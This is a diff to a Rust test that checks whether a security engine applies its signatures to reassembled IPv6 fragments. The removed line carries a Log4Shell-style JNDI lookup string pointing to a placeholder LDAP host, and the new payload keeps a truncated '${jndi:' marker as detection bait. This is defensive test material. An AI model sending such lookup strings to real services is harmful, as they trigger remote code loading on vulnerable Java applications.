@@ -88,7 +88,10 @@ fn security_reports_conflicting_ipv6_fragments() {
 
 #[test]
 fn reassembled_ipv6_payload_runs_through_security_signatures() {
-    let payload = b"\x13\x88\x01\xbbabcdefghijkl${jndi:ldap://example.test/x}";
+    let mut payload = [0_u8; 20].to_vec();
+    payload[..4].copy_from_slice(&[0x13, 0x88, 0x01, 0xbb]);
+    payload[12] = 0x50;
+    payload.extend_from_slice(b"${jndi:");
     let split = 24;
     let mut security = SecurityEngine::default();
     security.update(&fragment_packet(1, 9, 0, true, &payload[..split]));
